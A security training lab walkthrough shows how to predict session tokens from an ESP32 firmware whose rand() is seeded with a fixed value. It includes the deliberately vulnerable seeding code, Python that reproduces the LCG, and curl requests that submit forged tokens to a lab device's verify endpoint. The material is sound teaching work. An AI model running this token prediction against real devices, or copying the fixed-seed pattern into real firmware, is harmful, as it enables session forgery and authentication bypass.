# L28: Weak Random Number Generator

## Goal
Predict session tokens by exploiting a weak random number generator seeded with a fixed value (`srand(12345)`).

## Background

**Why this matters**: Weak RNGs produce predictable values. When used for session tokens, encryption keys, or nonces, attackers can predict values and compromise security.

**What you're looking for in IoT devices:**
- Session tokens or keys generated with weak RNG
- RNG seeded with predictable values (time, uptime, constant)
- Use of `rand()` instead of cryptographic RNG (`esp_random()`, `/dev/urandom`)
- Fixed seeds left in from development/testing

**On CoreS3**: The firmware seeds with `srand(12345)` at boot, so the token sequence from `/api/token` is identical every time. The `/api/token/verify` endpoint accepts predicted tokens.

**The Linear Congruential Generator (LCG):**

The ESP32 newlib `rand()` uses a 64-bit LCG:

```
state(n+1) = (6364136223846793005 * state(n) + 1) mod 2^64
rand()     = (state >> 32) & 0x7FFFFFFF
```

If you know the seed and algorithm, you can predict every future value.

**Vulnerable code pattern:**
```cpp
srand(12345);  // Fixed seed!

String generateToken() {
    int token = rand();  // Completely predictable
    return String(token);
}
```

**Secure alternative:** ESP32-S3 has a hardware RNG using RF noise as entropy. Use `esp_random()` for true random 32-bit values instead of deterministic `rand()`.

## Lab Walkthrough

### Step 1: Collect Sample Tokens

Request multiple tokens from `/api/token`, then reboot and request again to confirm the sequence is fixed.

```bash
# Generate 5 tokens from the device
for i in {1..5}; do
  curl -s http://192.168.4.1/api/token
  echo
done

# Expected output (same sequence every boot):
# {"token":134732914}
# {"token":37310602}
# {"token":141776306}
# {"token":988986983}
# {"token":942306040}
```

```bash
# Reboot via UART (pio device monitor -b 115200 -> "reboot")
# Then request tokens again - IDENTICAL sequence confirms fixed seed:
for i in {1..5}; do
  curl -s http://192.168.4.1/api/token
  echo
done
```

### Step 2: Identify the RNG Algorithm

Test whether the newlib `rand()` formula with seed 12345 reproduces the observed tokens.

```bash
python3 << 'EOF'
# ESP32 newlib 64-bit LCG:
#   state(n+1) = (6364136223846793005 * state(n) + 1) mod 2^64
#   rand()     = (state >> 32) & 0x7FFFFFFF

def lcg_rand(seed):
    """Reproduce ESP32 newlib rand() with known seed"""
    state = seed
    while True:
        state = (6364136223846793005 * state + 1) & 0xFFFFFFFFFFFFFFFF
        yield (state >> 32) & 0x7FFFFFFF

# Test with seed 12345 (the hardcoded value in firmware)
rng = lcg_rand(12345)
predicted = [next(rng) for _ in range(5)]

print("Predicted tokens with seed 12345:")
for i, t in enumerate(predicted):
    print(f"  Token {i+1}: {t}")

# Compare with observed device output:
observed = [134732914, 37310602, 141776306, 988986983, 942306040]

print("\nComparison:")
for i in range(5):
    match = "MATCH" if predicted[i] == observed[i] else "MISMATCH"
    print(f"  Predicted: {predicted[i]}  Observed: {observed[i]}  [{match}]")
EOF

# Expected output:
# Predicted tokens with seed 12345:
#   Token 1: 134732914
#   Token 2: 37310602
#   Token 3: 141776306
#   Token 4: 988986983
#   Token 5: 942306040
#
# Comparison:
#   Predicted: 134732914  Observed: 134732914  [MATCH]
#   Predicted: 37310602   Observed: 37310602   [MATCH]
#   Predicted: 141776306  Observed: 141776306  [MATCH]
#   Predicted: 988986983  Observed: 988986983  [MATCH]
#   Predicted: 942306040  Observed: 942306040  [MATCH]
```

All five match - seed confirmed as 12345, algorithm is ESP32 newlib 64-bit LCG.

### Step 3: Predict Future Tokens

Generate upcoming tokens offline, then verify them against `/api/token/verify`.

```bash
python3 << 'EOF'
import requests

def lcg_rand(seed):
    """Reproduce ESP32 newlib rand() with known seed"""
    state = seed
    while True:
        state = (6364136223846793005 * state + 1) & 0xFFFFFFFFFFFFFFFF
        yield (state >> 32) & 0x7FFFFFFF

# Generate the full token sequence
rng = lcg_rand(12345)
all_tokens = [next(rng) for _ in range(20)]

print("Full predicted token sequence:")
for i, t in enumerate(all_tokens):
    print(f"  Token {i+1:2d}: {t}")

# The device has already issued 5 tokens (from Step 1)
# The next token it will generate is token #6
next_token = all_tokens[5]
print(f"\nNext token device will issue: {next_token}")

# Verify a predicted token against the device
print("\nVerifying predicted token against /api/token/verify...")
r = requests.post('http://192.168.4.1/api/token/verify',
                   data={'token': str(all_tokens[0])})
print(f"  Token: {all_tokens[0]}")
print(f"  Response: {r.text}")
EOF

# Expected output:
# Full predicted token sequence:
#   Token  1: 134732914
#   Token  2: 37310602
#   Token  3: 141776306
#   ...
#
# Verifying predicted token against /api/token/verify...
#   Token: 134732914
#   Response: Valid
```

### Step 4: Demonstrate Full Token Prediction Attack

Request the next token from the device and confirm you already predicted it.

```bash
# Request the next token from the device
curl -s http://192.168.4.1/api/token
# Expected: {"token":811005817}  (or whichever is next in sequence)

# You already knew this value before requesting it!
# Verify it matches your prediction:
python3 -c "
state = 12345
for i in range(6):
    state = (6364136223846793005 * state + 1) & 0xFFFFFFFFFFFFFFFF
    val = (state >> 32) & 0x7FFFFFFF
    print(f'Token {i+1}: {val}')
print(f'\nToken 6 (next expected): {val}')
"

# Verify the predicted token is accepted
curl -s -X POST http://192.168.4.1/api/token/verify \
  -d "token=811005817"
# Expected: Valid
```

## Impact

- Firmware uses `srand(12345)` with a hardcoded fixed seed
- RNG algorithm is ESP32 newlib 64-bit LCG - fully reversible
- All future tokens predictable without querying the device
- Predicted tokens accepted by `/api/token/verify`
- Complete session token forgery - any token-based auth is fully bypassed

## References

- [CWE-330: Use of Insufficiently Random Values](https://cwe.mitre.org/data/definitions/330.html)
- [CWE-335: Incorrect Usage of Seeds in Pseudo-Random Number Generator](https://cwe.mitre.org/data/definitions/335.html)
- [ESP32 Hardware Random Number Generator](https://docs.espressif.com/projects/esp-idf/en/latest/esp32s3/api-reference/system/random.html)
- [OWASP Cryptographic Failures](https://owasp.org/Top10/A02_2021-Cryptographic_Failures/)
- [Linear Congruential Generator - Wikipedia](https://en.wikipedia.org/wiki/Linear_congruential_generator)
